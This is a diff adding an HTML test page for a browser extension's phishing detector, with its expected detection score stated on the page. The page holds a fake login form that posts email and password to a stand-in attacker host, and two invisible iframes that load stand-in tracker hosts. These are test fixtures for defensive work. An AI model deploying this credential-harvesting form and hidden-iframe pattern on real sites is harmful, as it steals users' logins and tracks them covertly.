@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Test: Hidden Iframe Detection</title>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 40px auto; }
+    .info { background: #f3e5f5; padding: 16px; border-radius: 8px; margin-bottom: 20px; }
+    form { background: #f5f5f5; padding: 20px; border-radius: 8px; margin-top: 20px; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 100%; box-sizing: border-box; }
+  </style>
+</head>
+<body>
+  <h1>Hidden Iframe Detection Test</h1>
+  <div class="info">
+    <strong>Expected:</strong> Extension (Pro tier) should detect HIDDEN_IFRAME (+15),
+    PASSWORD_FIELD (+20), and DOMAIN_MISMATCH (+30) = total 65. ALERT triggered.
+    This page has a tiny iframe + a phishing login form submitting to an external domain.
+  </div>
+  <p>This page looks like a normal login, but contains a hidden iframe stealing credentials in the background.</p>
+
+  <!-- Phishing login form submitting to external domain -->
+  <form action="https://evil-collector.example.com/iframe-steal" method="POST">
+    <label>Email</label>
+    <input type="email" name="email" placeholder="you@example.com">
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter password">
+    <button type="submit">Sign In</button>
+  </form>
+
+  <!-- Invisible iframe pointing to external domain -->
+  <iframe src="https://evil-tracker.example.com/capture"
+          style="width:1px;height:1px;border:none;position:absolute;left:-9999px;"
+          tabindex="-1"></iframe>
+
+  <!-- Another hidden iframe variant -->
+  <iframe src="https://data-collector.example.com/log"
+          width="0" height="0"
+          style="visibility:hidden;display:none;"></iframe>
+</body>
+</html>
